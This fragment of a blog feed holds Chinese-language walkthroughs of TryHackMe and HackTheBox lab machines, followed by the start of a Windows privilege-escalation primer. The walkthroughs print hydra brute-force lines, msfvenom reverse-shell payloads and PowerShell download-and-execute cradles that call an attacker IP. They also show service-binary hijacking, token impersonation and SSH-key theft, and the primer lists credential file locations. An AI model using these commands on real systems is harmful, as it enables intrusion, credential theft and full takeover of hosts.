shell.pl<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Offensive Pentesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackPark</title>
    <link href="/2024/10/28/HackPark/"/>
    <url>/2024/10/28/HackPark/</url>
    
    <content type="html"><![CDATA[<h1 id="HackPark"><a href="#HackPark" class="headerlink" title="HackPark"></a>HackPark</h1><h2 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h2><p>nmap扫了一下，发现只有80和3389端口开放。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202410282339916.png" alt="image-20241028233904024"></p><p>扫下目录</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202410290018155.png" alt="image-20241029001844975"></p><p>扫到后台登录入口。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202410290027908.png" alt="image-20241029002730836"></p><p>这里尝试利用hydra进行密码的爆破，用户名设置成admin.</p><p>利用hydra进行post登录表单的爆破。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202410292056865.png" alt="image-20241029205635372"></p><p>注意格式。</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pf">hydra -P <span class="hljs-variable">&lt;单词列表&gt;</span> -v <span class="hljs-variable">&lt;ip&gt;</span> <span class="hljs-variable">&lt;协议&gt;</span>   对您选择的协议进行暴力破解<br>hydra -v -V -u -L <span class="hljs-variable">&lt;用户名列表&gt;</span> -P <span class="hljs-variable">&lt;密码列表&gt;</span> -t <span class="hljs-number">1</span> -u <span class="hljs-variable">&lt;ip&gt;</span> <span class="hljs-variable">&lt;协议&gt;</span><br>您可以使用 Hydra 暴力破解用户名和密码。它将循环遍历列表中的每个组合。（-vV = 详细模式，显示登录尝试）<br>hydra -t <span class="hljs-number">1</span> -V -f -l <span class="hljs-variable">&lt;用户名&gt;</span> -P <span class="hljs-variable">&lt;单词列表&gt;</span> rdp://<span class="hljs-variable">&lt;ip&gt;</span><br>使用密码列表攻击 Windows 远程桌面。<br>hydra -l <span class="hljs-variable">&lt;用户名&gt;</span> -P .<span class="hljs-variable">&lt;密码列表&gt;</span> <span class="hljs-variable">$ip</span> -V http-form-post &#x27;/wp-login.php:<span class="hljs-keyword">log</span>=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=<span class="hljs-number">1</span>:S=Location&#x27;<br>为 Hydra 制定更具体的强制要求。<br></code></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>登进去之后查看版本信息，是一个3.3.6.0 的。</p><p>exploit找一个对应的版本进行利用。稍作修改即可。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041541347.png" alt="image-20241104154126236"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041549972.png" alt="image-20241104154958884"></p><p>这里进行文件上传。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041553835.png" alt="image-20241104155322770"></p><p>可以看到已经反弹成功。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>但是现在还不是最高权限，需要进行一个提权。</p><p>可以用msf生成一个exe文件 然后上传上去，利用meterpreter身份来进行信息的收集和进一步的利用。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">msfvenom -<span class="hljs-selector-tag">p</span> windows/meterpreter/reverse_tcp -<span class="hljs-selector-tag">a</span> x86 <span class="hljs-attr">--encoder</span> x86/shikata_ga_nai LHOST=<span class="hljs-number">10.14</span>.<span class="hljs-number">74.6</span> LPORT= -f exe -o shell-name.exe<br></code></pre></td></tr></table></figure><p>然后在kali上开启一个http服务，在windows那一端利用powershell上传生成的文件。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041620165.png" alt="image-20241104162037084"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">powershell -c wget &#x27;http://10.14.74.6:<span class="hljs-number">8080</span>/shell-name.exe&#x27; -outfile &#x27;shell.exe&#x27;<br><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041626240.png" alt="image-20241104162622191"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041626191.png" alt="image-20241104162648143"></p><p>可以看到已经上传成功了。</p><p>但是去查看的时候并没有发现这个exe文件。</p><p>那就要考虑其他目录了。</p><p>去看了一下temp目录，发现可以成功。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041646273.png" alt="image-20241104164658056"></p><p>上面是测试了一下，是否能写入文件。</p><p>上传成功之后运行那个exe文件 然后接收反弹的shell。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> PAYLOAD <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span> <br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST your-thm-ip</span> <br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT listening-port</span> <br>run<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041655734.png" alt="image-20241104165502649"></p><p>可以看到已经成功了。</p><p>下面就是信息收集。</p><p>利用WinPeas进行枚举。</p><p><a href="https://github.com/peass-ng/PEASS-ng/releases/tag/20231203-9cdcb38f">https://github.com/peass-ng/PEASS-ng/releases/tag/20231203-9cdcb38f</a></p><p>将winPeas64.exe上传上去。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041750247.png" alt="image-20241104175037089"></p><p>然后运行。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041752496.png" alt="image-20241104175229407"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041802245.png" alt="image-20241104180219138"></p><p>这能枚举出挺多信息的。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041809417.png" alt="image-20241104180905339"></p><p>这能找到异常的服务。查看一下这个服务的配置信息。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041822194.png" alt="image-20241104182203120"></p><p>到C:\PROGRA<del>2\SYSTEM</del>1目录下看了一下，里面有个events目录，进去看看，有一个日志文件，大概每隔30秒执行一次，并且身份是Administrator。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041824111.png" alt="image-20241104182424020"></p><p>我们可以生成一个恶意的exe文件，然后代替这个Message.exe文件，最终让它以administrator的身份运行起来。</p><p>将原来的Message.exe替换成一个新的名字 然后将恶意的exe换成Message.exe</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">move</span> Message.<span class="hljs-keyword">exe</span> Message2.<span class="hljs-keyword">exe</span><br><span class="hljs-keyword">move</span> <span class="hljs-keyword">c</span>:\Windows\Temp\<span class="hljs-keyword">shell</span>-name.<span class="hljs-keyword">exe</span>  Message.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><p>然后在msf监听端口，接收shell即可。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411041924112.png" alt="image-20241104192405047"></p>]]></content>
    
    
    <categories>
      
      <category>Offensive Pentesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Alfred</title>
    <link href="/2024/09/21/Alfred/"/>
    <url>/2024/09/21/Alfred/</url>
    
    <content type="html"><![CDATA[<h1 id="Alfred"><a href="#Alfred" class="headerlink" title="Alfred"></a>Alfred</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫下端口。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409212159400.png" alt="image-20240921215925176"></p><p>8080端口是一个后台登录的，弱口令admin admin进行登录。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>参考链接：</p><p><a href="https://www.jenkins.io/doc/book/managing/script-console/">https://www.jenkins.io/doc/book/managing/script-console/</a></p><p>里面有这样一句话：</p><p>Jenkins 具有 Groovy 脚本控制台，允许用户在 Jenkins 控制器运行时或代理运行时运行任意 Groovy 脚本。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409212240071.png" alt="image-20240921224028866"></p><p>去访问script</p><p>然后去网上了搜了一下Groovy命令执行的函数。参考链接：<a href="https://www.cnblogs.com/yyhuni/p/18012041">https://www.cnblogs.com/yyhuni/p/18012041</a></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs groovy">println <span class="hljs-string">&quot;whoami&quot;</span>.execute().text<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409212242080.png" alt="image-20240921224245004"></p><p>可以看到命令执行成功。</p><p>这里我们去github上面找一个powershell反弹shell的脚本。</p><p>这里使用的nishang里面的代码 </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409212306244.png" alt="image-20240921230634185"></p><p><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a></p><p>在攻击机上面开一个python服务，使得80开启。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">iex</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&#x27;</span>);<span class="hljs-built_in">Invoke-PowerShellTcp</span> <span class="hljs-literal">-Reverse</span> <span class="hljs-literal">-IPAddress</span> your<span class="hljs-literal">-ip</span> <span class="hljs-literal">-Port</span> your<span class="hljs-literal">-port</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409212254364.png" alt="image-20240921225432216"></p><p>可以看到普通shell已经拿到。</p><p>使用msfvenom生成的exe文件获取meterpreter </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai <span class="hljs-attribute">LHOST</span>=10.14.74.6 <span class="hljs-attribute">LPORT</span>=1234 -f exe -o shell-name.exe<br></code></pre></td></tr></table></figure><p>生成完之后利用 </p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">powershell &quot;(New-Object System.Net.WebClient).Downloadfile(<span class="hljs-string">&#x27;http://your-thm-ip:8000/shell-name.exe&#x27;</span>,<span class="hljs-string">&#x27;shell-name.exe&#x27;</span>)&quot;<br></code></pre></td></tr></table></figure><p> 进行同样的操作。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409212348592.png" alt="image-20240921234817471"></p><p>已经上传进去了。</p><p>然后进入msf进行监听端口。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> PAYLOAD <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST your-thm-ip</span> <br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT listening-port</span> <br>run<br></code></pre></td></tr></table></figure><p>最后运行exe文件 Start-Process “shell-name.exe” 等待监听</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409212357581.png" alt="image-20240921235747489"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>现在还不是administrator权限。</p><p>先到powershell模式下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">load powershell<br>powershell_shell<br></code></pre></td></tr></table></figure><p>查看一下分配的权限 whoami /priv</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409262144405.png" alt="image-20240926214433185"></p><p>这里的话其实能提权的地方不少，但是有的需要远程登陆到windows上才行，但也有我们能用的。</p><p> <strong>SeImpersonatePrivilege</strong>和<strong>SeDebugPrivilege</strong></p><p>对于模拟令牌，有不同的级别：</p><ul><li>SecurityAnonymous：当前用户/客户端无法冒充其他用户/客户端</li><li>SecurityIdentification：当前用户/客户端可以获取客户端的身份和权限，但不能冒充客户端</li><li>SecurityImpersonation：当前用户/客户端可以在本地系统上模拟客户端的安全上下文</li><li>SecurityDelegation：当前用户/客户端可以在远程系统上模拟客户端的安全上下文</li></ul><p>下面是一些比较常见的滥用的权限：</p><ul><li>SeImpersonatePrivilege</li><li>SeAssignPrimaryPrivilege</li><li>SeTcbPrivilege</li><li>SeBackupPrivilege</li><li>SeRestorePrivilege</li><li>SeCreateTokenPrivilege</li><li>SeLoadDriverPrivilege</li><li>SeTakeOwnershipPrivilege</li><li>SeDebugPrivilege</li></ul><p>参考:<a href="https://www.exploit-db.com/papers/42556">https://www.exploit-db.com/papers/42556</a></p><p>下面是再meterpreter中使用这个提权方法。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">load incognito  <span class="hljs-regexp">//</span>加载模块<br>list_tokens -g   <span class="hljs-regexp">//</span>查看可用令牌<br>impersonate_token <span class="hljs-string">&quot;BUILTIN\Administrators&quot;</span>  <span class="hljs-regexp">//</span>模拟管理员令牌<br>ps  <span class="hljs-regexp">//</span>查看进程<br>migrate PID <span class="hljs-regexp">//</span>迁移进程<br><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409262208224.png" alt="image-20240926220853152"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409262211838.png" alt="image-20240926221129775"></p><p>这样即便有了更高权限，但是仍然不是特权用户，是由于 Windows 处理权限的方式 - 它使用进程的主令牌而不是模拟令牌来确定进程可以做什么或不能做什么。</p><p>我们ps看一下进程，找与getuid一样的程序。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409262348812.png" alt="image-20240926234823536"></p><p>还是有挺多的。 使用命令迁移，迁移到与getuid名称一样的程序。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409262355354.png" alt="image-20240926235503241"></p>]]></content>
    
    
    <categories>
      
      <category>Offensive Pentesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Steel Mountain</title>
    <link href="/2024/09/21/Steel%20Mountain/"/>
    <url>/2024/09/21/Steel%20Mountain/</url>
    
    <content type="html"><![CDATA[<h1 id="Steel-Mountain"><a href="#Steel-Mountain" class="headerlink" title="Steel Mountain"></a>Steel Mountain</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先访问一下网站信息。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211453703.png" alt="image-20240921145336352"></p><p>这有一个最佳员工的图片，但我们并不知道名字，查看一下网页源代码。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211454459.png" alt="image-20240921145433982"></p><p>Bill HarPer就是他的名字。</p><p>nmap看一下开放的端口信息。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211540971.png" alt="image-20240921154017827"></p><h2 id="普通shell"><a href="#普通shell" class="headerlink" title="普通shell"></a>普通shell</h2><p>Rejetto <em>HTTP File Server</em> 2.3版本存在漏洞。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211546813.png" alt="image-20240921154629676"></p><p>找到一个可以利用的。</p><p>是一个CVE <a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6287">2014-6287</a></p><p>然后msf里面也有，上线msf就行。</p><p>就是设置好参数即可。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211616343.png" alt="image-20240921161627246"></p><p>现在获得的是普通用户的权限，下面就是进行提权。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>使用Powerup的powershell脚本。</p><p><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1</a></p><p>先使用upload上传上去。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211634874.png" alt="image-20240921163432739"></p><p>在meterpreter中进行powershell模式，需要先输入 load powershell加载这个模式，然后输入powershell_shell</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211637083.png" alt="image-20240921163702001"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211640386.png" alt="image-20240921164034230"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211642334.png" alt="image-20240921164245162"></p><p>这些都标记为true 很明显是利用未加引号的服务路径进行提权。</p><p>使用msfvenom生成一个exe文件。</p><p>然后开一个python服务，上传进去，把这个exe文件给代替一下，然后重启服务。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211722340.png" alt="image-20240921172258165"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211723386.png" alt="image-20240921172313274"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409211723691.png" alt="image-20240921172323617"></p><p>可以看到提权成功。</p>]]></content>
    
    
    <categories>
      
      <category>Offensive Pentesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kenobi</title>
    <link href="/2024/09/10/Kenobi/"/>
    <url>/2024/09/10/Kenobi/</url>
    
    <content type="html"><![CDATA[<h1 id="Kenobi"><a href="#Kenobi" class="headerlink" title="Kenobi"></a>Kenobi</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先对其端口信息进行一个扫描。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409101952886.png" alt="image-20240910195241621"></p><p>21 22 139 445 以及80端口开放。</p><p>其中samba服务是开启的。</p><p>nmap 有一个脚本是枚举samba共享的。</p><p><code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.25.79</code></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409102007890.png" alt="image-20240910200754712"></p><p>使用enum4linux 也能枚举samba服务。</p><p>比nmap那个更清晰。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409102027018.png" alt="image-20240910202710920"></p><p>我们使用smbclient连接到远程samba服务共享。</p><p>然后经过测试发现，anonymous和IPC$ 是无密码的，然后print$ 无密码的话是登录不进去的，同时只有anonmous 在ls下有文件。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409102043907.png" alt="image-20240910204322770"></p><p>递归下载文件。</p><p><code>smbget -R smb:// 10.10.25.79 /anonymous</code></p><p>我这个不知道为什么下载不了…</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409102105651.png" alt="image-20240910210509539"></p><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>上面开启了21端口，我们试一下ftp登录。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409112147376.png" alt="image-20240911214709282"></p><p>发现ProFTPD的版本信息，去搜索一下对应的漏洞信息。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409112153764.png" alt="image-20240911215324642"></p><p>有4个可以利用的。</p><p>漏洞利用思路:</p><p>大体上就是利用漏洞将用户的ssh密钥文件移动到我们可以看见的挂载的地方，因为它是一个smb服务，创建一个共享目录，将可看见的挂载的地方挂载到共享目录去，然后我们就能在攻击机上面得到该ssh私钥文件，利用该文件进行ssh登录。 </p><p>下面是详细的过程：</p><p>mod_copy 模块实现了<strong>SITE CPFR</strong>和<strong>SITE CPTO</strong>命令，这些命令可用于将文件/目录从服务器上的一个位置复制到另一个位置。任何未经身份验证的客户端都可以利用这些命令将文件从 文件系统的任何部分复制到选定的目标。</p><p>我们知道 FTP 服务以 Kenobi 用户身份运行（从共享上的文件），并且为该用户生成了一个 ssh 密钥。 </p><p>我们现在将 使用 SITE CPFR 和 SITE CPTO 命令复制 Kenobi 的私钥。</p><p>我们知道 /var 目录是我们可以看见的挂载 因此，我们现在将 Kenobi 的私钥移至 /var/tmp 目录。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409112229521.png" alt="image-20240911222936418"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409112232773.png" alt="image-20240911223222649"></p><p>现在/mnt/fsrm/tmp目录下存放着ssh的私钥，我们可以利用这个登录Kenobi用户。</p><p>记得需要修改id_rsa的权限 修改为600</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409112308207.png" alt="image-20240911230802144"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>然后下面就是尝试提权，sudo提权不太行，那就查看一下哪些具有suid位。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409112310192.png" alt="image-20240911231003129"></p><p>这里利用的是/usr/bin/menu</p><p>先运行一下这个程序</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409112318666.png" alt="image-20240911231825571"></p><p>选择1，这个功能就相当于curl,然后我们可以将/bin/sh 写入到curl中，并将curl设置成777权限，然后再将其添加到PATH中，当这个suid程序再次运行1时，就会触发这个curl。</p><p>通过：PATH 环境变量提权。</p><p>先来看一下$PATH里面有什么。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409112327635.png" alt="image-20240911232746587"></p><p>有/tmp，可以将curl添加到/tmp中。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409112322813.png" alt="image-20240911232219724"></p><p>提权成功。</p>]]></content>
    
    
    <categories>
      
      <category>Offensive Pentesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GreenHorn</title>
    <link href="/2024/08/06/GreenHorn/"/>
    <url>/2024/08/06/GreenHorn/</url>
    
    <content type="html"><![CDATA[<h1 id="GreenHorn"><a href="#GreenHorn" class="headerlink" title="GreenHorn"></a>GreenHorn</h1><p>进行端口的扫描：<br><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408061639040.png" alt="image-20240806163948955"></p><p>22端口开放，然后我们去看一下80端口，发现访问不了，需要在/etc/hosts文件中进行相应的添加。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408061639801.png" alt="image-20240806163909685"></p><p>然后去访问，寻找有用的信息。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408061641607.png" alt="image-20240806164155499"></p><p>发现版本号，去exploit中查一下漏洞。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408061646224.png" alt="image-20240806164602132"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408061649043.png" alt="image-20240806164936983"></p><p>这里我们需要登录进去才行，然后我们去访问一下3000端口看一下信息。</p><p>扫一下目录，找到了源码，然后进行审计。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408061709437.png" alt="image-20240806170947368"></p><p>密码就在pass.php里面<img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408061715520.png" alt="image-20240806171517402"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408061716814.png" alt="image-20240806171608732"></p><p>然后进行一个登录。</p>]]></content>
    
    
    <categories>
      
      <category>第五季</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hackthebox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初识windows提权</title>
    <link href="/2024/08/05/windows%E6%8F%90%E6%9D%83/"/>
    <url>/2024/08/05/windows%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="初识windows提权"><a href="#初识windows提权" class="headerlink" title="初识windows提权"></a>初识windows提权</h1><p>Windows系统分为两种不同的用户，一种是拥有管理员权限的用户属于管理员组，另一种是拥有普通系统权限的用户，属于用户组。</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Administrators</strong></td><td>这些用户拥有最高的权限。他们可以更改任何系统配置参数并访问系统中的任何文件。</td></tr><tr><td><strong>Standard Users</strong></td><td>这些用户可以访问计算机，但只能执行有限的任务。通常，这些用户无法对系统进行永久性或必要的更改，并且只能访问自己的文件。</td></tr></tbody></table><p>还有一些特殊的内置账户，由Windows系统设置和管理，通常情况下我们无法使用。</p><table><thead><tr><th><strong>SYSTEM / LocalSystem</strong></th><th>操作系统用于执行内部任务的帐户。它对主机上的所有文件和资源具有完全访问权限，甚至比管理员的权限更高。</th></tr></thead><tbody><tr><td><strong>Local Service</strong></td><td>用于以“最低”权限运行 Windows 服务的默认帐户。它将使用网络上的匿名连接。</td></tr><tr><td><strong>Network Service</strong></td><td>用于以“最小”权限运行 Windows 服务的默认帐户。它将使用计算机凭据通过网络进行身份验证。</td></tr></tbody></table><p>最低权限和最小权限的区别在于，最低权限在某些特殊情况下也不能进行权限的升级，但最小权限在特殊情况下可以进行权限的升级，完成之后再降为普通权限。(最低权限强调的是整体的策略，而最小权限强调的是特定任务的权限管理)</p><h2 id="从常见地方获取密码："><a href="#从常见地方获取密码：" class="headerlink" title="从常见地方获取密码："></a>从常见地方获取密码：</h2><h3 id="Unattended-Windows-Installations"><a href="#Unattended-Windows-Installations" class="headerlink" title="Unattended Windows Installations"></a>Unattended Windows Installations</h3><p>在大量主机上安装windows时，管理员可以使用windows部署服务，该服务允许通过网络将单个操作系统映像部署到多个主机。这些类型的安装称为无人值守安装，因为它们不需要用户交互。此类安装需要使用管理员帐户执行初始设置，最终可能会存储在计算机的以下位置：</p><ul><li>C:\Unattend.xml</li><li>C:\Windows\Panther\Unattend.xml</li><li>C:\Windows\Panther\Unattend\Unattend.xml</li><li>C:\Windows\system32\sysprep.inf</li><li>C:\Windows\system32\sysprep\sysprep.xml</li></ul><h3 id="Powershell-History"><a href="#Powershell-History" class="headerlink" title="Powershell History"></a>Powershell History</h3><p>每当用户使用 Powershell 运行命令时，它都会被存储到一个保存过去命令记忆的文件中。这对于快速重复以前使用过的命令非常有用。如果用户运行的命令直接在 Powershell 命令行中包含密码，我们则可以在cmd.exe中使用命令 <code>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code>来获取历史信息。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408062014616.png" alt="image-20240806201435413"></p><p>然后上面的命令是在cmd.exe中生效，如果在powshell中的话，需要将%userprofile%替换为<code>$Env:userprofile</code> </p><p>Powshell: <code>type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408062018345.png" alt="image-20240806201836281"></p><h3 id="Saved-Windows-Credentials"><a href="#Saved-Windows-Credentials" class="headerlink" title="Saved Windows Credentials"></a>Saved Windows Credentials</h3><p>Windows 